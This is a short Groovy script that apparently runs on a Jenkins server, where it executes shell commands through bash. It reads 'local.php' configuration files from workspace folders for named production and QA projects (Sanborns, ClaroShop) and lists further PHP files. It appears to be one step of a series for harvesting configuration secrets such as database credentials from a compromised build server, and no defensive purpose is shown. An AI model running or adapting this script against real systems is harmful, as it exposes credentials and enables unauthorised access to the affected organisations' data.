// MICRO-AE: Read remaining local.php files - sanbornos, QA, Release
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(20000)
    out.toString().take(6000)
}

println "=== SANBORNOS PRODUCCION local.php ==="
def san_prod = run("cat '/var/jenkins_home/workspace/_trash/name_it/ApiSoap-Sanbonrns/produccion/local.php' 2>/dev/null")
println san_prod.take(5000)

println "\n=== API QA V2 local.php ==="
def qa_v2 = run("cat '/var/jenkins_home/workspace/_trash/name_it/Api/QA/V2/local.php' 2>/dev/null")
println qa_v2.take(3000)

println "\n=== ClaroShop dir structure ==="
def cs_struct = run("find '/var/jenkins_home/workspace/_trash/name_it/ClaroShop' -type f -name '*.php' 2>/dev/null | head -20")
println cs_struct.take(1000)

println "\n=== DONE MICRO-AE ==="
